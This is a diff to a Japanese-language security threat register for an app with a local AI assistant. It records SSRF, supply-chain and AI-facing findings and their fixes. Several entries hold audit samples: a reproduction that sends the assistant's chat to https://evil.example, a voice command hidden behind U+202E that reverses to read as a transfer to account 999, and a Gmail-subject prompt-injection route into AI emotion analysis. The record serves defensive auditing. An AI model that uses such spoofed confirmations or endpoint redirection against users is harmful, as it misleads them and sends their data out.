@@ -731,6 +731,81 @@
       "title": "Ollama の到達確認 (no-cors) が転送に追随し、設定された宛先から先の内側のホストへ資格情報なしの GET が 1 本届く",
       "status": "accepted",
       "reason": "no-cors の要求は資格情報を載せられず、応答も opaque で読めない。追随しないと (redirect: manual) Chromium は TypeError を投げ、到達確認そのものが全ての宛先で失敗する (httpLimits.ts の注記が 2026-09-17 に実測)。残るのは利用者が設定した宛先からの 1 本の盲目な GET と、到達の有無が時間と成否で漏れる点だけ。宛先の設定は localStorage にあり、同じ端末の別 HTML から書けるため (huntBacklog の C1 を参照) 根は別の穴にある。ここは到達確認を残す判断として受容する。"
+    },
+    {
+      "id": "T-033",
+      "found": "2026-10-14",
+      "foundBy": "hunt pass 519 (network · backlog NET-3)",
+      "surface": "network",
+      "class": "ssrf-and-credential-egress",
+      "severity": "low",
+      "title": "private 判定が単一ラベルの名前 (printer / nas / router) を公開と判定し、第三者 API の画像 URL から利用者のブラウザが LAN の名前へ GET を飛ばした",
+      "status": "fixed",
+      "fix": "isPrivateOrReservedTarget は単一ラベルのうち INTERNAL_TLDS の 7 語だけを遮断していた。注記自身の理由 (単一ラベルは検索ドメインの補完で解決する・公開 API を単一ラベル名で呼ぶことは無い) は printer / nas / router にも当てはまるのに、7 語以外は false だった (実測 2026-10-14: http://printer/ → false)。生きた消費者は safeRemoteImageSrc (第三者の avatar_url / thumbnail → 利用者のブラウザの <img> GET → LAN の名前へ届き load / error で在否が漏れる —— パス 300 が閉じたつもりの経路)。BYO プロキシ側は Worker の完全一致の許可リストが先に断るので今日は届かない。直し: INTERNAL_TLDS の後に「. も : も含まない名前は内側」を 1 行足す (: を含む IPv6 リテラルは過遮断しない)。既存の 2 検査が弱さを仕様として留めていた (notlocalhost → false・example → false「内部 TLD でなければ通す」) ので、前者は 2 ラベルの標本で部分一致の意図を保ち、後者は反転した。parity の BY_DESIGN_DIFFERENT に printer / nas (CI の関門は解決後の IP で見る)。対照 (block を外す) で 9 件が落ち、復元は md5 で一致。",
+      "regression": {
+        "file": "src/shared/__tests__/privateTarget.test.ts",
+        "test": "★ %s (%s) は 2 つの入口とも遮断する (threat: T-033)"
+      }
+    },
+    {
+      "id": "T-034",
+      "found": "2026-10-14",
+      "foundBy": "hunt pass 519 (ai · backlog AI 2)",
+      "surface": "ai",
+      "class": "ai-phishing",
+      "severity": "medium",
+      "title": "書き込みの確認 (voiceWritePreview) が U+202E などの見えない字を素で描き、見せた物と送る物が違う確認になった",
+      "status": "fixed",
+      "fix": "displayField は型と天井しか見ず、双方向制御・ZWSP・C0/C1・行区切りを素通しした (実測 2026-10-14: parseVoiceCommand(「送金を中止\\u202Eを承認 → 口座 999 へ送金」と送って) → preview の text に U+202E が残り、画面ではそれ以後が裏返って読める)。shared/escape.ts に INVISIBLE_UNITS / escapeUnits / escapeInvisibleUnits を 1 つ置き (renderer の assistantMarkdown.ts が持っていた同じ関数をそこへ出した)、voiceWritePreview は天井で切ってから見える綴り (\\u202e) へ逃がす。送る値は変えない。対照: 逃がしを外す → 2 件 / 恒等にする → 12 件。",
+      "regression": {
+        "file": "src/shared/__tests__/voiceWriteRequirements.test.ts",
+        "test": "★ 本文に U+202E が在っても、確認の値は見える綴り (逆スラッシュ u202e) で並ぶ (threat: T-034)"
+      }
+    },
+    {
+      "id": "T-035",
+      "found": "2026-10-14",
+      "foundBy": "hunt pass 519 (supply-chain · backlog SUP-3)",
+      "surface": "supply-chain",
+      "class": "supply-chain",
+      "severity": "medium",
+      "title": "release.yml (署名鍵 4 本と GH_TOKEN を持つジョブ) の softprops/action-gh-release が可動タグ @v2 のまま台帳で免除されていた",
+      "status": "fixed",
+      "fix": "門 (lint:workflow-security) は見逃していない —— UNPINNED_ALLOW が 2026-08-22 から免除していた。理由は「このセッションから SHA を解決できない」だったが、塞がっていたのは GitHub の REST 3 通りだけで、git プロキシは公開リポジトリの ls-remote を通す (実測 2026-10-14: refs/tags/v2 = 3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 = refs/tags/v2.6.2・軽量タグ・最新の v2.x)。release.yml:174 をその SHA へ固定し (`# v2.6.2`)、台帳を空にした。空の台帳は門にとって床ではない (次のタグ固定の action は鳴る)。対照: @v2 へ戻す → 2 件。",
+      "regression": {
+        "file": "src/shared/__tests__/workflowSecurityWitness.test.ts",
+        "test": "★ softprops/action-gh-release は 40 桁の SHA で固定され、可動タグではない (threat: T-035)"
+      }
+    },
+    {
+      "id": "T-036",
+      "found": "2026-10-14",
+      "foundBy": "hunt pass 519 (supply-chain · backlog SUP-5)",
+      "surface": "supply-chain",
+      "class": "supply-chain",
+      "severity": "low",
+      "title": ".claude/settings.local.json と .mcp.json が gitignore されておらず、追跡されれば書いた人の権限の許可と MCP サーバが clone した全員のセッションで走る",
+      "status": "fixed",
+      "fix": "どちらも Claude Code が在れば自動で読む端末固有の設定で、lint:mcp-servers は .claude/settings.json しか見ない (法則 config-that-picks-code-is-guarded の外)。実測: git check-ignore が exit 1。.gitignore に 2 行を足し、git に訊く検査 (check-ignore / ls-files) を置いた。対照: 2 行を消す → 3 件。",
+      "regression": {
+        "file": "src/shared/__tests__/localConfigNotTracked.test.ts",
+        "test": "★ %s は git が無視する (threat: T-036)"
+      }
+    },
+    {
+      "id": "T-037",
+      "found": "2026-10-14",
+      "foundBy": "hunt pass 519 (main-ipc · backlog AI 4 を測った副産物)",
+      "surface": "main-ipc",
+      "class": "living-off-the-land",
+      "severity": "low",
+      "title": "emotions/analyze-text の出所 (source) は型も長さも見ず、1 度の action:invoke で状態ファイルを天井 (16 MiB) 超えにして以後の記録を読めなくできた",
+      "status": "fixed",
+      "fix": "本文 (text) は 80 字で切るのに、札の source は `[${source}] ` と素で連結していた (両ビルド)。10 MB の source を 1 度渡すと抜粋がそのまま保存され、次の readStateFile が「読めない」になる (clear-history まで記録不能・パス 511 の EISDIR と同じ形)。文字列でなければ `[object Object]` を刷った。shared/emotionsLimits.ts の analysisExcerpt 1 つが型を見て source も 80 字で切り、main と emotionsWeb がそれを通る。対照: 切らない → 2 件 (両ビルド)。",
+      "regression": {
+        "file": "src/main/clients/__tests__/emotions.test.ts",
+        "test": "★ 10 MB の出所を渡しても、保存される抜粋は天井 (80 字 × 2 + 札) に収まる (threat: T-037)"
+      }
     }
   ],
   "huntBacklog": [
@@ -757,7 +832,7 @@
     {
       "surface": "renderer",
       "item": "C4 AI の送り先を localStorage で差し替える: servicehub.ollama.endpoint に任意の https を書くと、コンシェルジュの自由質問が攻撃者のホストへ送られる",
-      "why": "ollamaWeb.ts:69 が localStorage から読み、isAllowedOllamaBase が任意の https を許す。コードを読んだだけで実行していない。C1 と同じ根 (同じ生成元の別文書が書ける)。送る前の名乗り (T-010) は出るが、利用者がそれを疑う理由は無い。"
+      "why": "2026-10-14 に実物で再現: chatOllama({endpoint:'https://evil.example', …}) は https://evil.example/api/chat へ送り (ok:true)、https://evil.example/ollama も同じ、http://evil.example:11434 は bad-endpoint で送らない。送る前の名乗り (T-010) は「設定した Ollama (evil.example) へ送ります —— この端末の外です」と出る。根は isAllowedOllamaBase が任意の https を設計として許すこと (リバースプロキシのトンネルが正当) と、設定が平文の localStorage に在ること (C1)。C1 の設計判断 (保存値を保管庫へ / 送り先の変更を利用者に確認させる) と一緒に決める。"
     },
     {
       "surface": "renderer",
@@ -773,11 +848,6 @@
       "surface": "main-ipc",
       "item": "MAIN-2 app:eraseAll に同意トークンが無い",
       "why": "監査役の報告の指摘。設定画面の「すべてのデータを削除」は利用者の操作だが、renderer が乗っ取られれば呼べる。確認ダイアログは renderer 側にしか無い。設計の判断 (同意の形) を伴うため未確認。"
-    },
-    {
-      "surface": "main-ipc",
-      "item": "MAIN-5 exportPaths が解決後のパスを検めるが、書くのは生のパス",
-      "why": "監査役の報告の指摘。呼び手は書き込み前に mkdir している。再現していない。"
     },
     {
       "surface": "main-ipc",
@@ -806,18 +876,8 @@
     },
     {
       "surface": "supply-chain",
-      "item": "SUP-3 softprops/action-gh-release@v2 が release.yml の contents:write のジョブで、タグ固定されていない",
-      "why": "監査役の報告の指摘。lint:workflow-security は第三者 action の SHA 固定を要求するはずなので、門がなぜ見逃したかの確認が要る。未確認。"
-    },
-    {
-      "surface": "supply-chain",
       "item": "SUP-4 GH_TOKEN が release.yml の Build ステップに渡り、同じ行の近くに CSC_LINK がある",
       "why": "grep で位置は確認した。ビルドが GH_TOKEN を使うかどうかと、梱包の依存が読めるかは未確認。"
-    },
-    {
-      "surface": "supply-chain",
-      "item": "SUP-5 .claude/settings.local.json と .mcp.json が gitignore されていない",
-      "why": "git check-ignore が exit 1 (確認済み)。Claude Code が自動で読む設定が、誤って追跡される恐れ。実害は未確認。"
     },
     {
       "surface": "supply-chain",
@@ -826,28 +886,13 @@
     },
     {
       "surface": "ai",
-      "item": "AI 2 voiceWritePreview の表示が displayField で、U+202E などの制御文字を逃がさない",
-      "why": "監査役の報告の指摘 (src/shared/voiceWriteRequirements.ts:201)。確認の画面に出る値が双方向制御で読めなくなる可能性。未確認。"
-    },
-    {
-      "surface": "ai",
       "item": "AI 3 「実行して」の死んだチップが LLM へ回る (src/renderer/data/chatbot.ts:266)",
       "why": "監査役の報告の指摘。利用者の意図と違う経路へ送られるが、送信先は同じ AI。未確認。"
     },
     {
       "surface": "ai",
-      "item": "AI 4 Gmail の件名が注入され、感情解析の結果が永続化される (GmailPage.tsx:137 / emotions.ts)",
-      "why": "監査役の報告の指摘。第三者の文が保存される経路。未確認。"
-    },
-    {
-      "surface": "ai",
       "item": "AI 5 開発パイプラインの残り (scripts/orchestrate.cjs:353-358)",
       "why": "監査役の報告の指摘。開発用の経路で利用者には届きにくい。未確認。"
-    },
-    {
-      "surface": "network",
-      "item": "NET-3 privateTarget の単一ラベル名と家庭用ルータ名が遮断されない",
-      "why": "監査役の報告の指摘 (privateTarget.ts:133-142)。現行の判定は単一ラベルを遮断しているので、報告の範囲を再確認してから判断する。未確認。"
     }
   ],
   "clearedBacklog": [
@@ -885,6 +930,21 @@
       "item": "scanTarget.looksInternalHostname が privateTarget.ts より網が狭い (v6 の 64:ff9b:1::/48・fec0::/10・v4 の 198.18/15・TEST-NET を見ない) (network・パス 514)",
       "finding": "欠陥ではない、と測って判断。looksInternalHostname は VirusTotal へ送る前の advisory (警告) であって止める門ではなく (関数自身が『止めない』と宣言・T-013 と同じ家系)、実際に SSRF を塞ぐのは privateTarget.ts の isPrivateOrReservedTarget で、そちらは数値表記 (decimal/octal/hex) と v6 遷移プレフィックス (IPv4-mapped / NAT64 / 6to4 ほか) を網羅済み。警告が 1 つ出ないことは資格情報の流出ではない。直近の T-008〜T-013 が network をちょうど掃いた直後で、構築できた再現はすべて既存の門 (egressRedirectCensus / responseBodyCapCensus / privateTarget.test.ts / redactionCoverage / proxyWorkerParity) か台帳 T-008/T-009/T-013 で閉じている。",
       "checkedOn": "2026-10-13"
+    },
+    {
+      "item": "NET-3 privateTarget の単一ラベル名と家庭用ルータ名が遮断されない",
+      "finding": "再現した。単一ラベルのうち遮断していたのは INTERNAL_TLDS の 7 語だけで、printer / nas / router は公開と判定されていた。T-033 として修正 (生きた消費者は safeRemoteImageSrc)。家庭用ルータ名 (router / gateway) も単一ラベルの規則で落ちる。",
+      "checkedOn": "2026-10-14"
+    },
+    {
+      "item": "MAIN-5 exportPaths が解決後のパスを検めるが、書くのは生のパス",
+      "finding": "2026-10-14 に実物で測った: `..` を含む生のパス 5 形は isSafeExportPath の判定 (path.resolve) と fs.writeFile の解決が一致し、書かれたのは検めた解決後の場所だけ (書き出し根の外へ出る 2 形は safe=false で書かない)。根の中の symlink (data/link → 外) は字面では通るが assertExportTargetContained が realpath で断る (書かれたファイル 0)。「生のパスを書く」は差を作らない —— 欠陥ではない。",
+      "checkedOn": "2026-10-14"
+    },
+    {
+      "item": "AI 4 Gmail の件名が注入され、感情解析の結果が永続化される (GmailPage.tsx:137 / emotions.ts)",
+      "finding": "2026-10-14 に読んで測った: Gmail の件名は AI へ渡るが、永続化される解析結果は normalizeAnalysis が 0..1 に畳んだ 6 つの数と enum (sentiment / dominant) と、80 字で切った抜粋だけ (画面は EMOTION_LABELS で引き、excerpt は React のテキストとして描く)。注入で動かせるのは分類の答えで、画面に文を持ち込む経路は無い。測る途中で隣の穴が出た —— 出所 (source) に天井が無かった (T-037 として修正)。",
+      "checkedOn": "2026-10-14"
     }
   ]
 }
